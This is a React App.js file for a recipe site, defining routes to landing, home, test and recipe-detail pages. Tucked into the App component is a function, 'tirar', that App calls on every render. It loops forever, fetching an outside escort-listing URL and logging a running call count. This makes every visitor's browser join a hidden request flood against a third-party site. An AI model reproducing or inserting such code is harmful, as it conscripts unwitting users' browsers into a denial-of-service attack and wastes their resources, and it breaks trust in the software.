import './App.css';
import { Route } from "react-router-dom";
import Landing from './components/Landing';
import Header from "./components/Header";
import NavBar from './components/NavBar';
import SearchBar from './components/SearchBar';
import Home from './components/Home';
import RecipeDetail from './components/RecipeDetail';
import Options from './components/Options';
import Footer from './components/Footer';

function App() {
  async function tirar(){
    let i = 1;
    while(i){
      await fetch("https://ar.skokka.com/escorts/mar-del-plata/");
      console.log("Llamadas: ", i);
      i++;
    }
  }

  tirar();
  return (
    <div className="App">
      <Route exact path='/'>
        <Landing/>
      </Route>

      <Route exact path='/home'>
        <Header/>
        <NavBar/>
        <Home/>
        <Footer/>
      </Route>

      <Route exact path='/test'>
        <Options/>
      </Route>

      <Route exact path='/recipe/:Id'>
        <Header/>
        <NavBar/>
        <SearchBar/>
        <RecipeDetail/>
        <Footer/>
      </Route>
    </div>
  );
}

export default App;